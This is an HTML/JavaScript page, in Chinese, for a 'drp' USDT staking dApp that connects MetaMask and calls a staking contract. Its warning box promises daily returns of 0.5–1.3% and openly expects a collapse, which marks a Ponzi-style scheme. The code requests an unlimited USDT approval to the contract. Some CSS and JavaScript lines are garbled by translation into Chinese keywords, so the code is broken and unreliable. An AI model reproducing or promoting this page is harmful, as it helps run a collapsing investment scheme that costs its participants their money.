<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset=“UTF-8”>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>drp 质押管理</title>
    <!-- 引入 Bootstrap 用于快速布局 -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- 引入 Ethers.js V6 -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        body { 背景颜色: #0f172a;颜色: #e2e8f0;字体族: 'Segoe UI', Tahoma, Geneva, Verdana, 无衬线字体; }
        .card { background-color: #1e293b; border: 1px solid #334155; }
        .card-title { color: #fff; }
        .btn-primary { background-color: #3b82f6; border: none; }
        .btn-primary:hover { background-color: #2563eb; }
        .btn-success { background-color: #10b981; border: none; }
        .btn-danger { background-color: #ef4444; border: none; }
        .btn-warning { background-color: #f59e0b; border: none; color: #fff; }
        .btn-warning:hover { background-color: #d97706; color: #fff; }
        .warning-box {
            background-color: #450a0a;
            border: 1px solid #ef4444;
            颜色: #fca5a5;
            padding: 15px;
            圆角: 8像素;
            下边距: 20像素;
            字体大小: 0.9rem;
        }
        .stat-value { font-size: 1.25rem; font-weight: bold; color: #38bdf8; }
        .stat-label { font-size: 0.85rem; color: #94a3b8; }
        .table { color: #cbd5e1; }
        .table thead th { border-bottom: 1px solid #475569; color: #94a3b8; font-size: 0.8rem; }
        .table td { border-bottom: 1px solid #334155; vertical-align: middle; }
        输入.form-control { 背景颜色: #334155; 边框颜色: #475569; 颜色: 白色; }
        input.form-control:focus { background-color: #334155; color: white; border-color: #38bdf8; box-shadow: none; }
.staking-btn-group{display:flex;间隙10像素弹性换行}
        .staking-btn-group .btn { flex: 1; min-width: 120px; }
        .badge-duration { background-color: #374151; color: #9ca3af; padding: 2px 6px; border-radius: 3px; font-size: 0.7rem; }
        .倒计时 { 
            字体族: 快递 新, 等宽字体; 
            background-color: #1f2937; 
            内边距: 2像素 6像素; 
            border-radius: 3px; 
            font-size: 0.75rem;
            display: inline-block;
        }
        .countdown-locked { color: #f87171; }
        .countdown-unlocked { color: #34d399; }
        .align-items-end label.form-label { color: wheat; }
        
        /* 新增：调整表格中特定列的字体大小 */
        .stake-time-cell { font-size: 0.8rem; }
        .remaining-time-cell { font-size: 0.8rem; }
        .status-cell { font-size: 0.8rem; }
        .action-cell { font-size: 0.8rem; }
        
        /* 调整ID和金额列的字体大小 */
        .table td:first-child { font-size: 0.85rem; } /* ID列 */
        .table td:nth-child(2) { font-size: 0.85rem; } /* 金额列 */
        
        /* 调整表格行高 */
        .表格 tbody 行 { 高度: 40像素; }
        
        /* 调整操作按钮大小 */
        .action-cell .btn-sm { 
            padding: 0.15rem 0.4rem; 
            font-size: 0.75rem; 
            行高: 1.2;
        }
        
        /* 新添加的样式 */
        .nav-tabs { border-bottom: 1px solid #334155; }
        .nav-tabs .nav-link { 
            颜色: #94a3b8;
            边框: 1像素 实线 透明;
            border-radius: 0.375rem 0.375rem 0 0;
        }
        .nav-tabs .nav-link:hover { 
            颜色: #cbd5e1;
            边框颜色: #475569;
        }
        .nav-tabs .nav-link.active { 
            color: #38bdf8; 
            background-color: #1e293b; 
            边框颜色: #475569 #475569 #1e293b;
        }
        .tab-content { padding-top: 1rem; }
        .address-short { 
            字体族: 快递 新, 等宽字体; 
            background-color: #1f2937; 
            内边距: 2像素 6像素; 
            border-radius: 3px; 
            字体大小: 0.8rem;
        }
        .total-stats-card { border-left: 4px solid #3b82f6; }        
    </style>
</head>
<body>

<div class="container py-5">
    <!-- 特别说明区域 -->
    <div class="warning-box">
        <h5 class="text-danger fw-bold">⚠️ 特别说明</h5>
        <ol class="mb-0">
            <li>1天日化0.5%，15天日化0.8%，30天日化1.3%。</li>
            <li>要崩盘前2天以上，页面会关闭质押功能，并提示解押。</li>
            <li>提示崩盘可能一周以上才会崩盘，但是别赚最后一分钱。</li>
            <li>请用一个新的干净钱包来参与。</li>
        </ol>
    </div>

    <!-- 钱包连接 -->
    <div class="d-flex justify-content-between align-items-center mb-4">
        <h3 class="fw-bold">drp Staking</h3>
        <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">连接钱包</button>
    </div>

    <!-- 数据统计面板 -->
    <div class="row mb-4 text-center g-2">
        <div class="col-6 col-md-3">
            <div class="card p-3 h-100">
                <div class="stat-label">我的 USDT 余额</div>
                <div class="stat-value" id="myBalance">0.0000</div>
            </div>
        </div>
        <div class="col-6 col-md-3">
            <div class="card p-3 h-100">
                <div class="stat-label">待提现余额 (合约内)</div>
                <div class="stat-value" id="stakedBalance">0.0000</div>
            </div>
        </div>
        <div class="col-6 col-md-3">
            <div class="card p-3 h-100">
                <div class="stat-label">可提现 USDT (池子)</div>
                <div class="stat-value" id="poolBalance">0.0000</div>
            </div>
        </div>
    </div>

    <!-- 质押操作区域 -->
    <div class="card mb-4">
        <div class="card-body">
            <h5 class="card-title mb-3">参与质押</h5>
            <div class="row g-3 align-items-end">
                <div class="col-md-6">
                    <label class="form-label">质押金额 (USDT)</label>
                    <input type="number" class="form-control" id="stakeAmount" value="1000" placeholder="输入金额">
                </div>
                <div class="col-md-6">
                    <label class="form-label d-block">选择质押周期</label>
                    <div class="staking-btn-group">
                        <button class="btn btn-success" onclick="handleStake(0, 1)">1天</button>
                        <button class="btn btn-success" onclick="handleStake(1, 15)">15天</button>
                        <button class="btn btn-success" onclick="handleStake(2, 30)">30天</button>
                    </div>
                </div>
            </div>
            <div class="mt-2 small text-white">
                * 注意：不同质押周期的日化率和解锁时间不同
            </div>
        </div>
    </div>

    <!-- 质押列表 -->
    <div class="card">
        <div class="card-body">
            <div class="d-flex justify-content-between align-items-center mb-3">
                <h5 class="card-title mb-0">我的质押记录</h5>
                <button class="btn btn-sm btn-outline-light" onclick="refreshData()">刷新数据</button>
            </div>
            <div class="table-responsive">
                <table class="table table-hover">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>金额 (USDT)</th>
                            <th>质押周期</th>
                            <th>质押时间</th>
                            <th>剩余时间</th>
                            <th>状态</th>
                            <th>操作</th>
                        </tr>
                    </thead>
                    <tbody id="stakeListBody">
                        <tr><td colspan="7" class="text-center">请连接钱包查看数据</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<script>
    // ================= 配置区域 =================
    const CONFIG = {
        STAKING: "0x7E1882b471F627Ba75935BCb12105545Eb8b4227",
        USDT: "0x55d398326f99059fF775485246999027B3197955",
        PAIR: "0xAB71C14094575C6ec8f2e61C708D5f4A3c3d5ca0",
        //在此处修改邀请人地址
        REFERRER: "0x1D4a49d7572997Ea5b3FD21976177Dbe20661136" 
    };
    
    // 质押周期配置 (秒)
    const STAKE_DURATIONS = {
        0: 86400,      // 1天
        1: 1296000,    // 15天 (15 * 86400)
        2: 2592000     // 30天 (30 * 86400)
    };
    
    const STAKE_DURATION_LABELS = {
        0: "1天",
        1: "15天", 
        2: "30天"
    };
    // ===========================================

    // ABIs
    const ABI_ERC20 = [
        "function balanceOf(address owner) view returns (uint256)",
        "function decimals() view returns (uint8)",
        "function approve(address spender, uint256 amount) returns (bool)",
        "function allowance(address owner, address spender) view returns (uint256)"
    ];

    const ABI_STAKING = [
        "function totalSupply() view returns (uint256)",
        "function balanceOf(address account) view returns (uint256)",
        "function stakeWithInviter(uint160 _amount, uint256 amountOutMin, uint8 _stakeIndex, address parent)",
        "function stake(uint160 _amount, uint256 amountOutMin, uint8 _stakeIndex)",
        "function unstake(uint256 index)",
        "function stakeCount(address user) view returns (uint256)",
        'function maxStakeAmount() view returns (uint256)',
        "function userStakeRecord(address user, uint256 index) view returns (uint40 stakeTime, uint160 amount, bool status, uint8 stakeIndex)"
    ];

    // 全局变量
    let provider, signer, userAddress;
    let stakingContract, usdtContract;
    let autoRefreshInterval = null;
    let countdownTimers = {};

    // 工具：格式化金额为4位小数
    function formatAmount(wei) {
        const val = ethers.formatUnits(wei, 18);
        return parseFloat(val).toFixed(0);
    }

    // 格式化时间：将秒转换为天、小时、分钟
    function formatTimeRemaining(seconds) {
        if (seconds <= 0) return "0秒";
        
        const days = Math.floor(seconds / 86400);
        const hours = Math.floor((seconds % 86400) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;
        
        let result = "";
        if (days > 0) result += `${days}天`;
        if (hours > 0) result += `${hours}小时`;
        if (minutes > 0 && days === 0) result += `${minutes}分`;
        if (secs > 0 && days === 0 && hours === 0) result += `${secs}秒`;
        
        return result || "0秒";
    }
    
 // 格式化质押时间：显示更简洁的时间格式
    function formatStakeTime(timestamp) {
        const date = new Date(timestamp * 1000);
        const now = new Date();
        const diffMs = now - date;
        const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
        
        // 如果是今天，显示时间
        if (diffDays === 0) {
            return date.toLocaleTimeString('zh-CN', { hour: '2-digit', minute: '2-digit' });
        } 
        // 如果是昨天
        else if (diffDays === 1) {
            return '昨天 ' + date.toLocaleTimeString('zh-CN', { hour: '2-digit', minute: '2-digit' });
        }
        // 如果是更早的时间
        else {
            return date.toLocaleDateString('zh-CN', { month: '2-digit', day: '2-digit' }) + ' ' + 
                   date.toLocaleTimeString('zh-CN', { hour: '2-digit', minute: '2-digit' });
        }
    }

        
    // 缩短地址显示
    function shortenAddress(address) {
        if (!address) return '';
        return address.substring(0, 6) + '...' + address.substring(address.length - 4);
    }

    // 1. 连接钱包
    async function connectWallet() {
        if (!window.ethereum) {
            alert("请安装 MetaMask!");
            return;
        }
        try {
            provider = new ethers.BrowserProvider(window.ethereum);
            signer = await provider.getSigner();
            userAddress = await signer.getAddress();
            
            // 更新UI
            document.getElementById('connectBtn').innerText = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
            document.getElementById('connectBtn').classList.replace('btn-primary', 'btn-success');

            // 初始化合约
            stakingContract = new ethers.Contract(CONFIG.STAKING, ABI_STAKING, signer);
            usdtContract = new ethers.Contract(CONFIG.USDT, ABI_ERC20, signer);

            // 加载数据
            await refreshData();
            
            // 启动自动刷新
            startAutoRefresh();
        } catch (error) {
            console.error("连接失败:", error);
            alert("连接钱包失败");
        }
    }

    // 2. 刷新所有数据
    async function refreshData() {
        if (!userAddress) return;
        const btn = document.querySelector('button[onclick="refreshData()"]');
        const originalText = btn.innerText;
        btn.innerText = "加载中...";
        
        try {
            // 2.1 获取我的 USDT 余额
            const myBal = await usdtContract.balanceOf(userAddress);
            document.getElementById('myBalance').innerText = formatAmount(myBal);

            // 2.2 获取待提现余额 (合约内的 balanceOf)
            const stakedBal = await stakingContract.balanceOf(userAddress);
            document.getElementById('stakedBalance').innerText = formatAmount(stakedBal);

            // 2.3 获取可提现余额 (池子里的 USDT)
            const poolBal = await usdtContract.balanceOf(CONFIG.PAIR);
            document.getElementById('poolBalance').innerText = formatAmount(poolBal);

            // 2.4 获取质押列表
            await renderStakeList();
            btn.innerText = "刷新";
        } catch (error) {
            console.error("数据加载错误:", error);
        } finally {
            btn.innerText = originalText;
        }
    }

    // 3. 渲染质押列表
    async function renderStakeList() {
        const tbody = document.getElementById('stakeListBody');
        tbody.innerHTML = '<tr><td colspan="7" class="text-center">加载中...</td></tr>';

        try {
            const count = await stakingContract.stakeCount(userAddress);
            let html = '';
            
            const now = Math.floor(Date.now() / 1000);

            // 清空旧的倒计时定时器
            Object.keys(countdownTimers).forEach(id => {
                clearInterval(countdownTimers[id]);
                delete countdownTimers[id];
            });

            // 倒序显示
            for (let i = Number(count) - 1; i >= 0; i--) {
                const record = await stakingContract.userStakeRecord(userAddress, i);
                
                const amount = formatAmount(record[1]); 
                const stakeTime = Number(record[0]);
                const stakeTimeStr = new Date(stakeTime * 1000).toLocaleString();
                const isActive = record[2]; 
                const stakeIndex = Number(record[3]);
                const durationSeconds = STAKE_DURATIONS[stakeIndex] || 86400; // 默认为1天
                
                // 计算解锁时间
                const unlockTime = stakeTime + durationSeconds;
                const timeRemaining = unlockTime - now;
                
                // 计算是否锁定
                const isLocked = timeRemaining > 0 && !isActive;
                const isUnlocked = timeRemaining <= 0 && !isActive;
                
                let statusHtml = '';
                let actionHtml = '';
                let timeRemainingHtml = '';
                let durationLabel = STAKE_DURATION_LABELS[stakeIndex] || "未知";

                if (isActive) {
                    statusHtml = '<span class="text-muted">已提取</span>';
                    actionHtml = '-';
                    timeRemainingHtml = '<span class="text-muted">-</span>';
                } else {
                    if (isLocked) {
                        // 锁仓中
                        statusHtml = '<span class="text-danger">锁仓中</span>';
                        actionHtml = `<button class="btn btn-sm btn-secondary" disabled>等待解锁</button>`;
                        
                        // 创建倒计时显示元素
                        timeRemainingHtml = `<span class="countdown countdown-locked" id="countdown-${i}">${formatTimeRemaining(timeRemaining)}</span>`;
                        
                        // 启动倒计时定时器
                        startCountdown(i, timeRemaining);
                    } else if (isUnlocked) {
                        // 可赎回
                        statusHtml = '<span class="text-success">可赎回</span>';
                        actionHtml = `<button class="btn btn-sm btn-warning" id="unstake-btn-${i}" onclick="handleUnstake(${i})">赎回</button>`;
                        timeRemainingHtml = '<span class="countdown countdown-unlocked">已解锁</span>';
                    } else {
                        statusHtml = '<span class="text-warning">未知</span>';
                        actionHtml = '-';
                        timeRemainingHtml = '-';
                    }
                }

                html += `
                    <tr>
                        <td>${i}</td>
                        <td>${amount}</td>
                        <td><span class="badge-duration">${durationLabel}</span></td>
                        <td>${stakeTimeStr}</td>
                        <td>${timeRemainingHtml}</td>
                        <td>${statusHtml}</td>
                        <td>${actionHtml}</td>
                    </tr>
                `;
            }

            if (Number(count) === 0) {
                html = '<tr><td colspan="7" class="text-center">暂无质押记录</td></tr>';
            }

            tbody.innerHTML = html;
        } catch (error) {
            console.error("列表加载失败:", error);
            tbody.innerHTML = '<tr><td colspan="7" class="text-center text-danger">列表加载失败</td></tr>';
        }
    }

    // 启动倒计时定时器
    function startCountdown(id, initialSeconds) {
        let remaining = initialSeconds;
        const countdownElement = document.getElementById(`countdown-${id}`);
        
        如果 (!countdownElement) 返回;
        
        const timer = setInterval(() => {
            remaining--;
            
            如果 (剩余 <= 0) {
                clearInterval(timer);
                // 刷新整个列表
                refreshData();
                return;
            }
            
            if (countdownElement) {
                countdownElement.textContent = formatTimeRemaining(remaining);
                
                // 更新倒计时颜色
                if (remaining <= 3600) { // 小于1小时
                    countdownElement.style.color = '#f87171'; // 红色
                } else if (remaining <= 86400) { // 小于1天
                    countdownElement.style.color = '#fbbf24'; // 黄色
                } else {
                    countdownElement.style.color = '#60a5fa'; // 蓝色
                }
            }
        }, 1000);
        
        countdownTimers[id] = timer;
    }

    // 4. 质押逻辑
    async function handleStake(stakeIndex, durationDays) {
        if (!userAddress) return alert("请先连接钱包");
        
        const amountStr = document.getElementById('stakeAmount').value;
        if (!amountStr || parseFloat(amountStr) <= 0) return alert("请输入有效金额");
        
        const amountWei = ethers.parseUnits(amountStr, 18);
        const referrer = CONFIG.REFERRER;
        
        // 获取所有质押按钮
        const buttons = document.querySelectorAll('.staking-btn-group .btn');
        const originalTexts = [];
        
        try {
            // 禁用所有质押按钮并保存原始文本
            buttons.forEach(btn => {
                originalTexts.push(btn.textContent);
                btn.disabled = true;
            });
            
            // 设置当前按钮的文本
            const currentBtn = event.target;
            currentBtn.textContent = "检查限额...";

            // 0. 限流检查
            const maxStakeAmount = await stakingContract.maxStakeAmount();
            const expected = ethers.parseUnits("1000", 18);
            if (maxStakeAmount !== expected) {
                alert("协议暂时限流，请等待10秒");
                return;
            }

            currentBtn.textContent = "检查授权...";

            // 1. 检查并授权 USDT
            const allowance = await usdtContract.allowance(userAddress, CONFIG.STAKING);
            if (allowance < amountWei) {
                currentBtn.textContent = "正在授权 USDT...";
                const txApprove = await usdtContract.approve(CONFIG.STAKING, ethers.MaxUint256); 
                await txApprove.wait();
            }

            // 2. 发起质押
            currentBtn.textContent = "正在质押...";
            const txStake = await stakingContract.stake(
                amountWei, 
                0, 
                stakeIndex
            );
            
            await txStake.wait();
            alert(`质押成功！周期：${durationDays}天`);
            refreshData();

        } catch (error) {
            console.error(error);
            if(error.reason) alert("合约错误: " + error.reason);
            else if(error.message.includes("User denied")) alert("用户取消交易");
            else alert("质押失败，请检查控制台");
        } finally {
            // 恢复所有按钮
            buttons.forEach((btn, index) => {
                btn.disabled = false;
                btn.textContent = originalTexts[index];
            });
        }
    }

    // 5. 赎回逻辑
    async function handleUnstake(index) {
        if (!userAddress) return;
        
        const btn = document.getElementById(`unstake-btn-${index}`);
        if(btn) {
            btn.disabled = true;
            btn.innerText = "处理中...";
        }

        try {
            const tx = await stakingContract.unstake(index);
            console.log("Transaction sent:", tx.hash);
            
            await tx.wait();
            alert("赎回成功！");
            refreshData();

        } catch (error) {
            console.error(error);
            if(btn) {
                btn.disabled = false;
                btn.innerText = "赎回";
            }
            
            if(error.reason) alert("合约错误: " + error.reason);
            else if(error.message.includes("User denied")) alert("用户取消交易");
            else alert("赎回失败，请检查控制台");
        }
    }

    // 6. 自动刷新功能
    function startAutoRefresh() {
        if (autoRefreshInterval) {
            clearInterval(autoRefreshInterval);
        }
        
        autoRefreshInterval = setInterval(async () => {
            if (userAddress) {
                await refreshData();
            }
        }, 30000); // 每30秒刷新一次
    }

    function autoRefresh() {
        const btn = document.getElementById('autoRefreshBtn');
        
        if (autoRefreshInterval) {
            clearInterval(autoRefreshInterval);
            autoRefreshInterval = null;
            btn.textContent = "自动刷新: 关闭";
            btn.classList.remove('btn-info');
            btn.classList.add('btn-outline-info');
        } else {
            startAutoRefresh();
            btn.textContent = "自动刷新: 开启";
            btn.classList.remove('btn-outline-info');
            btn.classList.add('btn-info');
        }
    }

    // 页面卸载时清理定时器
    window.addEventListener('beforeunload', () => {
        if (autoRefreshInterval) {
            clearInterval(autoRefreshInterval);
        }
        Object.keys(countdownTimers).forEach(id => {
            clearInterval(countdownTimers[id]);
        });
    });

    // 初始连接钱包
    window.addEventListener('load', () => {
        if (typeof window.ethereum !== 'undefined') {
            // 检查是否已连接
            window.ethereum.request({ method: 'eth_accounts' })
                .then(accounts => {
                    if (accounts.length > 0) {
                        connectWallet();
                    }
                });
        }
    });
</script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"65a056423e6e441d8a24f89a02024cd8","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>
</html>




